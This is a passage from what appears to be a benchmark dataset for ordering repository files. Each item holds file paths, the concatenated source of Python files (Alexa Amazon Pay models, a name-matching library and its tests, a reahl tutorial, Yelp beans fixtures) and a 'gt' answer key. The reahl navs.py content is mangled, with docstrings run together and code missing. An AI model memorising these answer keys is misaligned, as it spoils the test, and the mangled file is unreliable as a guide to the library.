Any\n    from datetime import datetime\n\n\nclass BillingAgreementType(Enum):\n\n    CustomerInitiatedTransaction = \"CustomerInitiatedTransaction\"\n    MerchantInitiatedTransaction = \"MerchantInitiatedTransaction\"\n\n    def to_dict(self):\n\n\n        result = {self.name: self.value}\n        return result\n\n    def to_str(self):\n\n\n        return pprint.pformat(self.value)\n\n    def __repr__(self):\n\n\n        return self.to_str()\n\n    def __eq__(self, other):\n\n\n        if not isinstance(other, BillingAgreementType):\n            return False\n\n        return self.__dict__ == other.__dict__\n\n    def __ne__(self, other):\n\n\n        return not self == other\n\n'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/interfaces/amazonpay/request/setup_amazon_pay_request.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nimport pprint\nimport re\nimport six\nimport typing\nfrom enum import Enum\nfrom ask_sdk_model.interfaces.amazonpay.model.request.base_amazon_pay_entity import BaseAmazonPayEntity\n\n\nif typing.TYPE_CHECKING:\n    from typing import Dict, List, Optional, Union, Any\n    from datetime import datetime\n    from ask_sdk_model.interfaces.amazonpay.model.request.billing_agreement_attributes import BillingAgreementAttributes as BillingAgreementAttributes_ec1c47b2\n\n\nclass SetupAmazonPayRequest(BaseAmazonPayEntity):\n\n    deserialized_types = {\n        'object_type': 'str',\n        'version': 'str',\n        'seller_id': 'str',\n        'country_of_establishment': 'str',\n        'ledger_currency': 'str',\n        'checkout_language': 'str',\n        'billing_agreement_attributes': 'ask_sdk_model.interfaces.amazonpay.model.request.billing_agreement_attributes.BillingAgreementAttributes',\n        'need_amazon_shipping_address': 'bool',\n        'sandbox_mode': 'bool',\n        'sandbox_customer_email_id': 'str'\n    }\n\n    attribute_map = {\n        'object_type': '@type',\n        'version': '@version',\n        'seller_id': 'sellerId',\n        'country_of_establishment': 'countryOfEstablishment',\n        'ledger_currency': 'ledgerCurrency',\n        'checkout_language': 'checkoutLanguage',\n        'billing_agreement_attributes': 'billingAgreementAttributes',\n        'need_amazon_shipping_address': 'needAmazonShippingAddress',\n        'sandbox_mode': 'sandboxMode',\n        'sandbox_customer_email_id': 'sandboxCustomerEmailId'\n    }\n    supports_multiple_types = False\n\n    def __init__(self, version=None, seller_id=None, country_of_establishment=None, ledger_currency=None, checkout_language=None, billing_agreement_attributes=None, need_amazon_shipping_address=False, sandbox_mode=False, sandbox_customer_email_id=None):\n\n\n        self.__discriminator_value = \"SetupAmazonPayRequest\"\n\n        self.object_type = self.__discriminator_value\n        super(SetupAmazonPayRequest, self).__init__(object_type=self.__discriminator_value, version=version)\n        self.seller_id = seller_id\n        self.country_of_establishment = country_of_establishment\n        self.ledger_currency = ledger_currency\n        self.checkout_language = checkout_language\n        self.billing_agreement_attributes = billing_agreement_attributes\n        self.need_amazon_shipping_address = need_amazon_shipping_address\n        self.sandbox_mode = sandbox_mode\n        self.sandbox_customer_email_id = sandbox_customer_email_id\n\n    def to_dict(self):\n\n\n        result = {}\n\n        for attr, _ in six.iteritems(self.deserialized_types):\n            value = getattr(self, attr)\n            if isinstance(value, list):\n                result[attr] = list(map(\n                    lambda x: x.to_dict() if hasattr(x, \"to_dict\") else\n                    x.value if isinstance(x, Enum) else x,\n                    value\n                ))\n            elif isinstance(value, Enum):\n                result[attr] = value.value\n            elif hasattr(value, \"to_dict\"):\n                result[attr] = value.to_dict()\n            elif isinstance(value, dict):\n                result[attr] = dict(map(\n                    lambda item: (item[0], item[1].to_dict())\n                    if hasattr(item[1], \"to_dict\") else\n                    (item[0], item[1].value)\n                    if isinstance(item[1], Enum) else item,\n                    value.items()\n                ))\n            else:\n                result[attr] = value\n\n        return result\n\n    def to_str(self):\n\n\n        return pprint.pformat(self.to_dict())\n\n    def __repr__(self):\n\n\n        return self.to_str()\n\n    def __eq__(self, other):\n\n\n        if not isinstance(other, SetupAmazonPayRequest):\n            return False\n\n        return self.__dict__ == other.__dict__\n\n    def __ne__(self, other):\n\n\n        return not self == other\n",
        "gt": [
            "'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/interfaces/amazonpay/model/request/billing_agreement_type.py'",
            "'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/interfaces/amazonpay/model/request/billing_agreement_attributes.py'",
            "'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/interfaces/amazonpay/request/setup_amazon_pay_request.py'",
            "'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/interfaces/amazonpay/request/__init__.py'"
        ]
    },
    {
        "files": [
            "'whoswho/whoswho/config/suffixes.py'",
            "'whoswho/whoswho/who.py'",
            "'whoswho/test/test_who.py'",
            "'whoswho/whoswho/config/__init__.py'"
        ],
        "content": "'whoswho/whoswho/config/suffixes.py'\n:\nfrom __future__ import unicode_literals\n\n\nUNIQUE_SUFFIXES = set([\n    'jr',\n    'jnr',\n    'sr',\n    'snr',\n    '2',\n    'i',\n    'ii',\n    'iii',\n    'iv',\n    'v',\n])\n\n\n\nEQUIVALENT_SUFFIXES = {\n    'jnr': 'jr',\n    'snr': 'sr',\n}\n\n\n\nMISC_SUFFIXES = set([\n    'esq',\n    'esquire',\n    'clu',\n    'chfc',\n    'cfp',\n    'md',\n    'phd',\n    'mp',\n    'qc',\n    'dmd',\n    'do',\n    'dds',\n    'dpm',\n])\n\n\n'whoswho/whoswho/who.py'\n:from copy import deepcopy\n\nfrom whoswho.model import Name\nfrom whoswho.config import SETTINGS\nfrom whoswho.utils import deep_update_dict\n\n\ndef match(fullname1, fullname2, strictness='default', options=None):\n\n\n    if options is not None:\n        settings = deepcopy(SETTINGS[strictness])\n        deep_update_dict(settings, options)\n    else:\n        settings = SETTINGS[strictness]\n\n    name1 = Name(fullname1)\n    name2 = Name(fullname2)\n\n    return name1.deep_compare(name2, settings)\n\n\ndef ratio(fullname1, fullname2, strictness='default', options=None):\n\n\n    if options is not None:\n        settings = deepcopy(SETTINGS[strictness])\n        deep_update_dict(settings, options)\n    else:\n        settings = SETTINGS[strictness]\n\n    name1 = Name(fullname1)\n    name2 = Name(fullname2)\n\n    return name1.ratio_deep_compare(name2, settings)\n\n'whoswho/test/test_who.py'\n:\nfrom __future__ import unicode_literals\n\nimport unittest\n\nimport nose\nfrom nose.tools import *\n\nfrom whoswho import who, config\n\nfrom nameparser.config.titles import TITLES as NAMEPARSER_TITLES\n\n\nclass TestMatch(unittest.TestCase):\n\n    def setUp(self):\n        self.name = 'Robert Evan Liebowitz'\n\n    def test_string(self):\n\n        assert_true(who.match(self.name, str('Robert Liebowitz')))\n\n    def test_unicode(self):\n        name = self.name\n        assert_true(who.match(name, 'attaché Robert Evan Liebowitz'))\n        assert_true(who.match(name, 'Rōbért Èvān Lîęböwitz'))\n        assert_false(who.match(name, 'Rōbért Èvān Lęîböwitz'))\n\n    def test_name_and_initials(self):\n        assert_true(who.match(self.name, 'R. Evan Liebowitz'))\n        assert_true(who.match(self.name, 'Robert E. Liebowitz'))\n        assert_true(who.match(self.name, 'R. E. Liebowitz'))\n\n    def test_different_number_initials(self):\n        assert_true(who.match(self.name, 'Robert Liebowitz'))\n        assert_true(who.match(self.name, 'R. Liebowitz'))\n        assert_false(who.match(self.name, 'Robert E. E. Liebowitz'))\n        assert_false(who.match(self.name, 'R. E. E. Liebowitz'))\n        assert_true(who.match('R.E.E. Liebowitz', 'R. E. E. Liebowitz'))\n\n    def test_different_initials(self):\n        assert_false(who.match(self.name, 'E. R. Liebowitz'))\n        assert_false(who.match(self.name, 'E. Liebowitz'))\n        assert_false(who.match(self.name, 'R. V. Liebowitz'))\n        assert_false(who.match(self.name, 'O. E. Liebowitz'))\n\n    def test_short_names(self):\n        assert_true(who.match(self.name, 'Rob Liebowitz'))\n\n        assert_false(who.match(self.name, 'Bert Liebowitz'))\n        assert_false(who.match(self.name, 'Robbie Liebowitz'))\n\n    def test_suffixes(self):\n        name = 'Robert Liebowitz Jr'\n        assert_true(who.match(name, 'Robert Liebowitz'))\n        assert_true(who.match(name, 'Robert Liebowitz Jr'))\n        assert_true(who.match(name, 'Robert Liebowitz, PhD'))\n        assert_false(who.match(name, 'Robert Liebowitz, Sr'))\n        assert_false(who.match(name, 'Robert Liebowitz, Sr, PhD'))\n        assert_true(who.match(name, 'Robert Liebowitz, Jr, PhD'))\n\n    def test_equivalent_suffixes(self):\n        name = 'Robert Liebowitz Jr'\n        assert_true(who.match(name, 'Robert Liebowitz Jnr'))\n        assert_false(who.match(name, 'Robert Liebowitz Snr'))\n\n    def test_titles(self):\n        name = 'Mr. Robert Liebowitz'\n        assert_true(who.match(name, 'Robert Liebowitz'))\n        assert_true(who.match(name, 'Sir Robert Liebowitz'))\n        assert_true(who.match(name, 'Dr. Robert Liebowitz'))\n        assert_false(who.match(name, 'Mrs. Robert Liebowitz'))\n\n    def test_nickname(self):\n        name = 'Robert \"Evan\" Liebowitz'\n        assert_true(who.match(name, 'Evan Liebowitz'))\n        assert_true(who.match('Evan Liebowitz', name))\n        assert_false(who.match(name, 'Wrongbert Lieobwitz'))\n        assert_false(who.match(name, 'Robert Evan'))\n        assert_false(who.match(name, 'Evan Liebowitz',\n                               options={'check_nickname': False}))\n\n\nclass TestRatio(unittest.TestCase):\n\n    def setUp(self):\n        self.name = 'Robert Evan Liebowitz'\n\n    def test_string(self):\n\n        assert_equal(who.ratio(self.name, str('Robert Liebowitz')), 100)\n\n    def test_unicode(self):\n        name = self.name\n        assert_equal(who.ratio(name, 'attaché Robert Evan Liebowitz'), 100)\n        assert_equal(who.ratio(name, 'Rōbért Èvān Lîęböwitz'), 100)\n        assert_true(who.ratio(name, 'Rōbért Èvān Lęîböwitz') < 100)\n\n    def test_name_and_initials(self):\n        assert_equal(who.ratio(self.name, 'R. Evan Liebowitz'), 100)\n        assert_equal(who.ratio(self.name, 'Robert E. Liebowitz'), 100)\n        assert_equal(who.ratio(self.name, 'R. E. Liebowitz'), 100)\n\n    def test_different_number_initials(self):\n        assert_equal(who.ratio(self.name, 'Robert Liebowitz'), 100)\n        assert_equal(who.ratio(self.name, 'R. Liebowitz'), 100)\n        assert_true(who.ratio(self.name, 'Robert E. E. Liebowitz') < 100)\n        assert_true(who.ratio(self.name, 'R. E. E. Liebowitz') < 100)\n        assert_equal(who.ratio('R.E.E. Liebowitz', 'R. E. E. Liebowitz'), 100)\n\n    def test_different_initials(self):\n        assert_true(who.ratio(self.name, 'E. R. Liebowitz') < 100)\n        assert_true(who.ratio(self.name, 'E. Liebowitz') < 100)\n        assert_true(who.ratio(self.name, 'R. V. Liebowitz') < 100)\n        assert_true(who.ratio(self.name, 'O. E. Liebowitz') < 100)\n        assert_true(who.ratio(self.name, 'E. R. Liebowitz') <\n                    who.ratio(self.name, 'E. E. Liebowitz'))\n        assert_true(who.ratio(self.name, 'E. R. Liebowitz') <\n                    who.ratio(self.name, 'R. R. Liebowitz'))\n        assert_true(who.ratio(self.name, 'E. R. Liebowitz') <\n                    who.ratio(self.name, 'E. Liebowitz'))\n\n    def test_short_names(self):\n        assert_true(who.ratio(self.name, 'Rob Liebowitz'))\n        assert_true(who.ratio(self.name, 'Bert Liebowitz') < 100)\n        assert_true(who.ratio(self.name, 'Robbie Liebowitz') < 100)\n        assert_true(who.ratio(self.name, 'xxxxx Liebowitz') <\n                    who.ratio(self.name, 'Bobby Liebowitz'))\n\n    def test_suffixes(self):\n        name = 'Robert Liebowitz Jr'\n        assert_equal(who.ratio(name, 'Robert Liebowitz'), 100)\n        assert_equal(who.ratio(name, 'Robert Liebowitz Jr'), 100)\n        assert_equal(who.ratio(name, 'Robert Liebowitz, PhD'), 100)\n        assert_false(who.ratio(name, 'Robert Liebowitz, Sr'))\n        assert_false(who.ratio(name, 'Robert Liebowitz, Sr, PhD'))\n        assert_equal(who.ratio(name, 'Robert Liebowitz, Jr, PhD'), 100)\n\n        assert_equal(who.ratio(name, 'Zachary Liebowitz, Jr'),\n                     who.ratio(name, 'Zachary Liebowitz'))\n\n    def test_equivalent_suffixes(self):\n        name = 'Robert Liebowitz Jr'\n        assert_equal(who.ratio(name, 'Robert Liebowitz Jnr'), 100)\n        assert_false(who.ratio(name, 'Robert Liebowitz Snr'))\n\n    def test_titles(self):\n        name = 'Mr. Robert Liebowitz'\n        assert_equal(who.ratio(name, 'Robert Liebowitz'), 100)\n        assert_equal(who.ratio(name, 'Sir Robert Liebowitz'), 100)\n        assert_equal(who.ratio(name, 'Dr. Robert Liebowitz'), 100)\n        assert_false(who.ratio(name, 'Mrs. Robert Liebowitz'))\n\n        assert_equal(who.ratio(name, 'Dr. Zachary Liebowitz'),\n                     who.ratio(name, 'Zachary Liebowitz'))\n\n    def test_nickname(self):\n        name = 'Robert \"Evan\" Liebowitz'\n        assert_equal(who.ratio(name, 'Evan Liebowitz'), 100)\n        assert_equal(who.ratio('Evan Liebowitz', name), 100)\n        assert_true(who.ratio(name, 'Wrongbert Lieobwitz') < 100)\n        assert_true(who.ratio(name, 'Robert Evan') < 100)\n        assert_true(who.ratio(name, 'Evan Liebowitz',\n                              options={'check_nickname': False}) < 100)\n        assert_true(who.ratio(name, 'xxxx Liebowitz') <\n                    who.ratio(name, 'xvax Liebowitz'))\n        assert_equal(who.ratio(name, 'xxxx Liebowitz'),\n                     who.ratio(name, 'xvax Liebowitz', 'strict'))\n\n\n\n@nottest\nclass TestConfig(unittest.TestCase):\n\n    def test_titles_all_defined(self):\n\n        all_titles = (\n            config.MALE_TITLES |\n            config.FEMALE_TITLES |\n            config.GENDERLESS_TITLES\n        )\n        assert_equal(all_titles, NAMEPARSER_TITLES)\n\n    def test_suffixes_all_defined(self):\n\n        from nameparser.config.suffixes import SUFFIX_ACRONYMS, SUFFIX_NOT_ACRONYMS\n        all_suffixes = (\n            config.UNIQUE_SUFFIXES |\n            config.MISC_SUFFIXES\n        )\n        nameparser_suffixes = (\n            SUFFIX_ACRONYMS |\n            SUFFIX_NOT_ACRONYMS\n        )\n        assert_equal(all_suffixes, nameparser_suffixes)\n\n\nif __name__ == '__main__':\n    nose.main()\n\n'whoswho/whoswho/config/__init__.py'\n:from .settings import *\nfrom .suffixes import *\nfrom .titles import *\n\n\nSTRIPPED_CHARACTERS = dict.fromkeys(map(ord, \".'\"), None)\n\nSETTINGS = {\n    'default': DEFAULT_SETTINGS,\n    'strict': STRICT_SETTINGS,\n    'lenient': LENIENT_SETTINGS\n}\n",
        "gt": [
            "'whoswho/whoswho/config/suffixes.py'",
            "'whoswho/whoswho/config/__init__.py'",
            "'whoswho/whoswho/who.py'",
            "'whoswho/test/test_who.py'"
        ]
    },
    {
        "files": [
            "'reahl/reahl-doc/reahl/doc/examples/tutorial/bootstrapgrids/bootstrapgrids.py'",
            "'reahl/reahl-doc/reahl/doc/examples/tutorial/bootstrapgrids/etc/web.config.py'",
            "'reahl/reahl-web/reahl/web/bootstrap/navs.py'"
        ],
        "content": "'reahl/reahl-doc/reahl/doc/examples/tutorial/bootstrapgrids/bootstrapgrids.py'\n:\nfrom reahl.web.fw import UserInterface, Layout\nfrom reahl.web.layout import PageLayout\nfrom reahl.web.bootstrap.page import HTML5Page\nfrom reahl.web.bootstrap.ui import P, Div, H\nfrom reahl.web.bootstrap.grid import Container, ColumnLayout, ColumnOptions, ResponsiveSize\nfrom reahl.web.bootstrap.navs import Nav\n\n\nclass GridBasicsPage(HTML5Page):\n    def __init__(self, view):\n        super().__init__(view)\n\n        self.body.use_layout(Container())\n\n        self.add_four()\n        self.add_twelve()\n\n    def add_four(self):\n        layout = ColumnLayout(ColumnOptions('first', ResponsiveSize(md=6)),\n                              ColumnOptions('second', ResponsiveSize(md=6)),\n                              ColumnOptions('third', ResponsiveSize(md=6)),\n                              ColumnOptions('fourth', ResponsiveSize(md=6)))\n\n        div = Div(self.view).use_layout(layout)\n        self.body.add_child(div)\n\n        message = '6/12ths on md and larger, else defaults to 12/12ths'\n        div.layout.columns['first'].add_child(P(self.view, text=message))\n        div.layout.columns['second'].add_child(P(self.view, text=message))\n        div.layout.columns['third'].add_child(P(self.view, text=message))\n        div.layout.columns['fourth'].add_child(P(self.view, text=message))\n\n\n    def add_twelve(self):\n        div = Div(self.view).use_layout(ColumnLayout())\n        self.body.add_child(div)\n\n        for i in range(1, 13):\n            column = div.layout.add_column(str(i), size=ResponsiveSize(md=1))\n            column.add_child(P(self.view, text='1/12th on md and larger'))\n\n\nclass PageLayoutPage(HTML5Page):\n    def __init__(self, view):\n        super().__init__(view)\n        self.body.use_layout(Container())\n        column_layout = ColumnLayout(ColumnOptions('left', ResponsiveSize(md=4)),\n                                     ColumnOptions('right', ResponsiveSize(md=8)))\n        self.use_layout(PageLayout(contents_layout=column_layout))\n\n        self.layout.header.add_child(P(view, text='The header'))\n        self.layout.footer.add_child(P(view, text='The footer'))\n\n        left = column_layout.columns['left']\n        left.add_child(P(view, text='To the left'))\n\n        right = column_layout.columns['right']\n        right.add_child(P(view, text='To the right'))\n\n\nclass CenteredLayout(Layout):\n    def customise_widget(self):\n        self.container = self.widget.add_child(Div(self.view))\n        self.container.use_layout(Container(fluid=False))\n        self.centre = self.container.add_child(Div(self.view))\n        column_layout = ColumnLayout(ColumnOptions('left', ResponsiveSize(md=4)),\n                                     ColumnOptions('right', ResponsiveSize(md=8)))\n        self.centre.use_layout(column_layout)\n\n    @property\n    def columns(self):\n        return self.centre.layout.columns\n\n\nclass ContainerPage(HTML5Page):\n    def __init__(self, view):\n        super().__init__(view)\n\n        page_layout = PageLayout(contents_layout=CenteredLayout(),\n                                 header_layout=Container(fluid=True),\n                                 footer_layout=Container(fluid=True))\n\n        self.use_layout(page_layout)\n\n        self.layout.header.add_child(P(view, text='The header'))\n        self.layout.footer.add_child(P(view, text='The footer'))\n\n        columns = page_layout.contents_layout.columns\n        left = columns['left']\n        left.add_child(P(view, text='To the left'))\n\n        right = columns['right']\n        right.add_child(P(view, text='To the right'))\n\n\nclass HomePage(HTML5Page):\n    def __init__(self, view, bookmarks):\n        super().__init__(view)\n\n        self.body.use_layout(Container())\n        self.add_child(H(view, 1, text='Examples'))\n        self.add_child(Nav(view).with_bookmarks(bookmarks))\n\n\n\nclass BootstrapGridsUI(UserInterface):\n    def assemble(self):\n        basics = self.define_view('/gridBasics', title='Grid basics', page=GridBasicsPage.factory())\n        page_layout = self.define_view('/pageLayout', title='Page layout', page=PageLayoutPage.factory())\n        container_layout = self.define_view('/containerLayout', title='Container layout', page=ContainerPage.factory())\n\n        bookmarks = [\n            basics.as_bookmark(self),\n            page_layout.as_bookmark(self),\n            container_layout.as_bookmark(self)]\n\n        self.define_view('/', title='Home', page=HomePage.factory(bookmarks))\n\n\n\n'reahl/reahl-doc/reahl/doc/examples/tutorial/bootstrapgrids/etc/web.config.py'\n:\nfrom reahl.doc.examples.tutorial.bootstrapgrids.bootstrapgrids import BootstrapGridsUI\n\nweb.site_root = BootstrapGridsUI\n\n\n\n\n'reahl/reahl-web/reahl/web/bootstrap/navs.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\"\"\"\n.. versionadded:: 3.2\n\nA Bootstrap \"Nav\" is a navigation menu: a list of items that are\nlinks to other Views. Navs can also have a second level so that if you\nclick on an item, a dropdown list of vertically stacked options\nappear.\n\nThis module contains the necessary Widgets and Layouts to create and\nstyle Bootstrap Navs.\n\n\n.. versionchanged:: 4.0\n   Moved Menu here from reahl.web.ui.\n\n.. versionchanged:: 4.0\n   Removed the .add_item and add_submenu methods in favour of .add_a,.add_bookmark,.add_dropdown methods.\n\nA visual menu that lists a number of Views to which the user can choose to go to.\n\n       .. admonition:: Styling\n\n          Rendered as a <ul class=\"reahl-menu\"> element that contains a <li> for each MenuItem.\n\n       :param view: (See :class:`reahl.web.fw.Widget`)\n\n       .. versionchanged:: 3.2\n          Deprecated use of `a_list` and changed it temporarily to a keyword argument for backwards compatibility.\n\n       .. versionchanged:: 3.2\n          Deprecated css_id keyword argument.\n\n       .. versionchanged:: 3.2\n          Deprecated the `from_xxx` methods and added `with_xxx` replacements to be used after construction.\n\n       .. versionchanged:: 3.2\n          Deprecated `add_item` and replaced it with `add_submenu`.\n\n       .. versionchanged:: 3.2\n          Added a number of `add_xxx` methods for adding items from different sources.\n\n       .. versionchanged:: 4.0\n          Removed deprecated a_list and css_id\n    Populates this Menu with a MenuItem for each Bookmark given in `bookmark_list`.\n\n           Answers the same Menu.\n\n           .. versionadded:: 3.2\n        Populates this Menu with a MenuItem for each available language.\n\n           Answers the same Menu.\n\n           .. versionadded:: 3.2\n        Populates this Menu with a MenuItem for each :class:`A` in `a_list`.\n\n           Answers the same Menu.\n\n           .. versionadded:: 3.2\n        Adds a MenuItem for the given :class:`Bookmark` to this Menu'.\n\n           Answers the added MenuItem.\n\n           .. versionadded:: 3.2\n        Adds an :class:`A` as a MenuItem.\n\n           Answers the added MenuItem.\n\n           .. versionadded:: 3.2\n        One item in a Menu. Different kinds of Menu render their items differently.\n\n       :param view: (See :class:`reahl.web.fw.Widget`)\n       :param a: The :class:`A` to use as link.\n       :keyword active_regex: If the href of `a` matches this regex, the MenuItem is deemed active.\n       :keyword exact_match: (See :meth:`reahl.web.fw.Url.is_currently_active`)\n\n       .. versionchanged:: 4.0\n          Removed from_bookmark and css_id keyword argument.\n    A Nav is a navigation menu, with items a user can click on to transition to\n    possibly different Views. Individual Items visually indicate whether they\n    are active or disabled.\n\n    .. note:: Don't be confused\n\n       This, the :class:`reahl.web.bootstrap.navs.Nav` is not the same thing as a simple\n       HTML-level :class:`reahl.web.bootstrap.ui.Nav`!\n\n    :param view: (See :class:`~reahl.web.fw.Widget`)\n    Adds the dropdown_menu :class:`DropdownMenu` to this Nav. It appears as the\n        top-level item with text `title`.\n\n        :keyword drop_position: Position relative to the item where the dropdown should appear ('up', 'down', 'left' or 'right').\n        :keyword query_arguments: (For internal use)\n        This Layout makes a Nav appear as horizontally or vertically arranged pills (buttons).\n\n    :keyword stacked: If True, the pills are stacked vertically.\n    :keyword content_alignment: If given, changes how content is aligned inside the Nav (default is start)\n                                (One of: center, end)\n    :keyword content_justification: If given, makes the content take up all space in the Nav. Either with elements having equal space (fill), or unequal space (justified)\n                                (One of: fill, justified)\n\n    This Layout makes a Nav appear as horizontal tabs.\n\n    :keyword content_alignment: If given, changes how content is aligned inside the Nav (default is start)\n                                (One of: center, end)\n    :keyword content_justification: If given, makes the content take up all space in the Nav. Either with elements having equal space (fill), or unequal space (justified)\n                                (One of: fill, justified)\n    A second-level menu that can be added to a Nav.Changes a DropdownMenu alignment.\n\n    :keyword align_right: If True, align the dropdown to the right side of its parent item, else to the left.\n    \"\"\"\n    def __init__(self, align_right=False):\n        super().__init__()\n        self.align_right = align_right\n\n    def customise_widget(self):\n        if self.align_right:\n            self.widget.append_class('dropdown-menu-right')\n\n",
        "gt": [
            "'reahl/reahl-web/reahl/web/bootstrap/navs.py'",
            "'reahl/reahl-doc/reahl/doc/examples/tutorial/bootstrapgrids/bootstrapgrids.py'",
            "'reahl/reahl-doc/reahl/doc/examples/tutorial/bootstrapgrids/etc/web.config.py'"
        ]
    },
    {
        "files": [
            "'beans/api/factory.py'",
            "'beans/api/main.py'",
            "'beans/api/tests/conftest.py'"
        ],
        "content": "'beans/api/factory.py'\n:from database import db\nfrom flask import Flask\nfrom yelp_beans.logic.config import get_config\n\n\ndef create_app():\n    app = Flask(__name__, template_folder=\"yelp_beans/templates\")\n    app.config[\"SQLALCHEMY_TRACK_MODIFICATIONS\"] = False\n    app.config[\"SQLALCHEMY_DATABASE_URI\"] = get_config().get(\"DATABASE_URL_PROD\", \"sqlite://\")\n    db.init_app(app)\n\n    from yelp_beans.routes.api.v1.meeting_requests import meeting_requests\n    from yelp_beans.routes.api.v1.metrics import metrics_blueprint\n    from yelp_beans.routes.api.v1.preferences import preferences_blueprint\n    from yelp_beans.routes.api.v1.subscriptions import subscriptions_blueprint\n    from yelp_beans.routes.api.v1.user import user_blueprint\n    from yelp_beans.routes.tasks import tasks\n\n\n    app.register_blueprint(tasks, url_prefix=\"/tasks\")\n\n\n    app.register_blueprint(meeting_requests, url_prefix=\"/v1/meeting_request\")\n    app.register_blueprint(metrics_blueprint, url_prefix=\"/v1/metrics\")\n    app.register_blueprint(\n        preferences_blueprint,\n        url_prefix=\"/v1/user/preferences\",\n    )\n    app.register_blueprint(\n        subscriptions_blueprint,\n        url_prefix=\"/v1/subscriptions\",\n    )\n    app.register_blueprint(user_blueprint, url_prefix=\"/v1/user\")\n\n    with app.app_context():\n        db.create_all()\n\n    return app\n\n'beans/api/main.py'\n:from factory import create_app\n\napp = create_app()\napp.app_context().push()\n\n\n@app.teardown_request\ndef teardown_request(*args, **kwargs):\n    \"Expire and remove the session after each request\"\n\n    from database import db\n\n    db.session.expire_all()\n    db.session.remove()\n\n\n@app.cli.command(\"create-dev-data\")\ndef create_dev_data_entrypoint():\n\n    from database import db\n    from tests.conftest import create_dev_data\n\n    create_dev_data(db.session)\n\n\nif __name__ == \"__main__\":\n    app.run()\n\n'beans/api/tests/conftest.py'\n:import logging\nimport time\nfrom collections import namedtuple\nfrom datetime import datetime\nfrom pathlib import Path\nfrom unittest import mock\n\nimport pytest\nfrom database import db\nfrom factory import create_app\nfrom pytz import timezone\nfrom pytz import utc\nfrom yelp_beans import send_email\nfrom yelp_beans.logic.subscription import get_specs_from_subscription\nfrom yelp_beans.logic.subscription import store_specs_from_subscription\nfrom yelp_beans.models import MeetingSubscription\nfrom yelp_beans.models import Rule\nfrom yelp_beans.models import SubscriptionDateTime\nfrom yelp_beans.models import User\nfrom yelp_beans.models import UserSubscriptionPreferences\n\nFAKE_USER = [\n    {\n        \"first_name\": \"Darwin\",\n        \"last_name\": \"Yelp\",\n        \"email\": \"darwin@yelp.com\",\n        \"photo_url\": (\n            \"https://s3-media4.fl.yelpcdn.com/assets/\"\n            \"srv0/yelp_large_assets/3f74899c069c\"\n            \"/assets/img/illustrations/mascots/darwin@2x.png\"\n        ),\n        \"department\": \"Consumer\",\n        \"business_title\": \"Engineer\",\n    }\n]\n\n\n@pytest.fixture(scope=\"session\", autouse=True)\ndef mock_config():\n    config = Path(__file__).parent / \"test_data/config.yaml\"\n    with config.open() as config_file:\n        data = config_file.read()\n    with mock.patch(\"yelp_beans.logic.config.open\", mock.mock_open(read_data=data)):\n        yield\n\n\n@pytest.fixture(scope=\"session\", autouse=True)\ndef sendgrid_mock():\n\n    with mock.patch.object(send_email, \"send_single_email\"):\n        yield\n\n\n@pytest.fixture()\ndef app():\n\n    app = create_app()\n    app.config.update(\n        {\n            \"TESTING\": True,\n        }\n    )\n    yield app\n\n\n@pytest.fixture()\ndef client(app):\n    return app.test_client()\n\n\n@pytest.fixture(scope=\"function\")\ndef session(app):\n\n    with app.app_context():\n        yield db.session\n\n\n@pytest.fixture\ndef subscription(session):\n    yield _subscription(session)\n\n\ndef _subscription(session):\n    zone = \"America/Los_Angeles\"\n    preference_1 = SubscriptionDateTime(datetime=datetime(2017, 1, 20, 23, 0, tzinfo=utc))\n\n    assert preference_1.datetime.astimezone(timezone(zone)).hour == 15\n    preference_1.datetime = preference_1.datetime.replace(tzinfo=None)\n    session.add(preference_1)\n\n    preference_2 = SubscriptionDateTime(datetime=datetime(2017, 1, 20, 19, 0, tzinfo=utc))\n\n    assert preference_2.datetime.astimezone(timezone(zone)).hour == 11\n    preference_2.datetime = preference_2.datetime.replace(tzinfo=None)\n    session.add(preference_2)\n\n    rule = Rule(name=\"office\", value=\"USA: CA SF New Montgomery Office\")\n    session.add(rule)\n\n    subscription = MeetingSubscription(\n        title=\"Yelp Weekly\",\n        size=2,\n        location=\"8th Floor\",\n        office=\"USA: CA SF New Montgomery Office\",\n        timezone=zone,\n        datetime=[preference_1, preference_2],\n        user_rules=[rule],\n    )\n    session.add(subscription)\n    session.commit()\n    return subscription\n\n\n@pytest.fixture\ndef database(session, subscription):\n    MeetingInfo = namedtuple(\"MeetingInfo\", [\"sub\", \"specs\", \"prefs\"])\n    week_start, specs = get_specs_from_subscription(subscription)\n    store_specs_from_subscription(subscription, week_start, specs)\n    return MeetingInfo(subscription, specs, [subscription.datetime[0], subscription.datetime[1]])\n\n\n@pytest.fixture\ndef database_no_specs(session, subscription):\n    MeetingInfo = namedtuple(\"MeetingInfo\", [\"sub\", \"specs\", \"prefs\"])\n    return MeetingInfo(subscription, [], [subscription.datetime[0], subscription.datetime[1]])\n\n\n@pytest.fixture\ndef employees():\n    with open(\"tests/test_data/employees.json\") as test_file:\n        return test_file.read()\n\n\n@pytest.fixture\ndef data_source():\n    yield [\n        {\n            \"first_name\": \"Sam\",\n            \"last_name\": \"Smith\",\n            \"email\": \"samsmith@yelp.com\",\n            \"photo_url\": \"www.cdn.com/SamSmith.png\",\n            \"metadata\": {\"department\": \"Engineering\", \"title\": \"Engineer\", \"floor\": \"10\", \"desk\": \"100\", \"manager\": \"Bo Demillo\"},\n        },\n        {\n            \"first_name\": \"Derrick\",\n            \"last_name\": \"Johnson\",\n            \"email\": \"derrickjohnson@yelp.com\",\n            \"photo_url\": \"www.cdn.com/DerrickJohnson.png\",\n            \"metadata\": {\"department\": \"Design\", \"title\": \"Designer\", \"floor\": \"12\", \"desk\": \"102\", \"manager\": \"Tracy Borne\"},\n        },\n    ]\n\n\n@pytest.fixture\ndef data_source_by_key():\n    yield {\n        \"samsmith@yelp.com\": {\n            \"first_name\": \"Sam\",\n            \"last_name\": \"Smith\",\n            \"email\": \"samsmith@yelp.com\",\n            \"photo_url\": \"www.cdn.com/SamSmith.png\",\n            \"metadata\": {\"department\": \"Engineering\", \"title\": \"Engineer\", \"floor\": \"10\", \"desk\": \"100\", \"manager\": \"Bo Demillo\"},\n        },\n        \"derrickjohnson@yelp.com\": {\n            \"first_name\": \"Derrick\",\n            \"last_name\": \"Johnson\",\n            \"email\": \"derrickjohnson@yelp.com\",\n            